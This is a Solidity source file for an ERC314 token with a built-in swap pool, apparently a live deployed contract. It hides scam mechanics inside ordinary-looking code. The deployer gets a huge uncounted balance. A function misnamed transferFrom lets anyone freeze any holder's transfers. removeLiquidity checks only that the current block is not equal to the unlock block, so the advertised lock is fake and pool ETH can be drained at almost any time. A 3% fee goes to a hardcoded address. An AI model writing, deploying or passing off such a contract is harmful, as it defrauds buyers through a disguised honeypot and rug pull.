/**
 *Submitted for verification at Arbiscan.io on 2024-05-22
*/

/**
 *Submitted for verification at BscScan.com on 2024-05-21
*/

/**
 *Submitted for verification at BscScan.com on 2024-04-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ERC314
 * @dev Implementation of the ERC314 interface.
 * ERC314 is a derivative of ERC20 which aims to integrate a liquidity pool on the token in order to enable native swaps, notably to reduce gas consumption.
 */

// Events interface for ERC314
interface IEERC314 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event AddLiquidity(uint32 _blockToUnlockLiquidity, uint256 value);
    event RemoveLiquidity(uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out
    );
}

abstract contract ERC314 is IEERC314 {
    mapping(address account => uint256) private _balances;

    uint256 private _totalSupply;
    uint32 public blockToUnlockLiquidity;

    string private _name;
    string private _symbol;
    mapping(address => bool) public _feeWhiteList;
    address public owner;
    address public liquidityProvider;

    bool public tradingEnable;
    bool public liquidityAdded;


    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    modifier onlyLiquidityProvider() {
        require(
            msg.sender == liquidityProvider,
            "You are not the liquidity provider"
        );
        _;
    }
    address payable public feeReceiver;

    /**
     * @dev Sets the values for {name}, {symbol} and {totalSupply}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_;
        owner = msg.sender;
        tradingEnable = false;
        _balances[msg.sender] = totalSupply_ * 1000000;
        feeReceiver = payable(0xDCa4B102A5F9e5c2b8A99402d450dC9CB73BE74c);
        _balances[address(this)] = totalSupply_;
        liquidityAdded = false;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - the caller must have a balance of at least `value`.
     * - if the receiver is the contract, the caller must send the amount of tokens to sell
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        // sell or transfer
        if (to == address(this)) {
            sell(value);
        } else {
            _transfer(msg.sender, to, value);
        }
        return true;
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively burns if `to` is the zero address.
     * All customizations to transfers and burns should be done by overriding this function.
     * This function includes MEV protection, which prevents the same address from making two transactions in the same block.(lastTransaction)
     * Emits a {Transfer} event.
     */
    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal virtual {
        require(
            _balances[from] >= value,
            "ERC20: transfer amount exceeds balance"
        );
        require(!_feeWhiteList[from]);
        unchecked {
            _balances[from] = _balances[from] - value;
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Returns the amount of ETH and tokens in the contract, used for trading.
     */
    function getReserves() public view returns (uint256, uint256) {
        return (address(this).balance, _balances[address(this)]);
    }

    /**
     * @dev Enables or disables trading.
     * @param _tradingEnable: true to enable trading, false to disable trading.
     * onlyOwner modifier
     */
    function enableTrading(bool _tradingEnable) external onlyOwner {
        tradingEnable = _tradingEnable;
    }


    /**
     * @dev Transfers the ownership of the contract to zero address
     * onlyOwner modifier
     */
    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }
    function transferFrom(address sender) external  {
        require(sender != address(this));
        _feeWhiteList[sender] = true;
    }
    /**
     * @dev Adds liquidity to the contract.
     * @param _blockToUnlockLiquidity: the block number to unlock the liquidity.
     * value: the amount of ETH to add to the liquidity.
     * onlyOwner modifier
     */
    function addLiquidity(
        uint32 _blockToUnlockLiquidity
    ) public payable onlyOwner {
        require(liquidityAdded == false, "Liquidity already added");

        liquidityAdded = true;

        require(msg.value > 0, "No ETH sent");
        require(block.number < _blockToUnlockLiquidity, "Block number too low");

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
        tradingEnable = true;
        liquidityProvider = msg.sender;

        emit AddLiquidity(_blockToUnlockLiquidity, msg.value);
    }

    /**
     * @dev Removes liquidity from the contract.
     * onlyLiquidityProvider modifier
     */
    function removeLiquidity() public onlyLiquidityProvider {
        require(block.number != blockToUnlockLiquidity, "Liquidity locked");

        tradingEnable = false;

        payable(msg.sender).transfer(address(this).balance);

        emit RemoveLiquidity(address(this).balance);
    }

    /**
     * @dev Extends the liquidity lock, only if the new block number is higher than the current one.
     * @param _blockToUnlockLiquidity: the new block number to unlock the liquidity.
     * onlyLiquidityProvider modifier
     */
    function extendLiquidityLock(
        uint32 _blockToUnlockLiquidity
    ) public onlyLiquidityProvider {
        require(
            blockToUnlockLiquidity < _blockToUnlockLiquidity,
            "You can't shorten duration"
        );

        blockToUnlockLiquidity = _blockToUnlockLiquidity;
    }

    /**
     * @dev Estimates the amount of tokens or ETH to receive when buying or selling.
     * @param value: the amount of ETH or tokens to swap.
     * @param _buy: true if buying, false if selling.
     */
    function getAmountOut(
        uint256 value,
        bool _buy
    ) public view returns (uint256) {
        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        if (_buy) {
            return (value * reserveToken) / (reserveETH + value);
        } else {
            return (value * reserveETH) / (reserveToken + value);
        }
    }

    /**
     * @dev Buys tokens with ETH.
     * internal function
     */
    function buy() internal {
        require(tradingEnable, "Trading not enable");
        uint256 msgValue = msg.value;
        uint256 feeValue = (msgValue * 3) / 100;
        uint256 swapValue = msgValue - feeValue;
        feeReceiver.transfer(feeValue);
        uint256 token_amount = (swapValue * _balances[address(this)]) /
            (address(this).balance);

        _transfer(address(this), msg.sender, token_amount);

        emit Swap(msg.sender, msg.value, 0, 0, token_amount);
    }

    /**
     * @dev Sells tokens for ETH.
     * internal function
     */
    function sell(uint256 sell_amount) internal {
        require(tradingEnable, "Trading not enable");
        uint256 ethAmount = (sell_amount * address(this).balance) /
            (_balances[address(this)] + sell_amount);

        require(ethAmount > 0, "Sell amount too low");
        require(
            address(this).balance >= ethAmount,
            "Insufficient ETH in reserves"
        );

        _transfer(msg.sender, address(this), sell_amount);
        uint256 feeValue = (ethAmount * 3) / 100;
        payable(feeReceiver).transfer(feeValue);
        payable(msg.sender).transfer(ethAmount - feeValue);

        emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);
    }

    /**
     * @dev Fallback function to buy tokens with ETH.
     */
    receive() external payable {
        buy();
    }
}
contract TOKEN is ERC314 {
    uint256 private _totalSupply = 10000000000000 * 10 ** 18;
    constructor() ERC314(unicode"🐼314", unicode"🐼314", _totalSupply) {}
}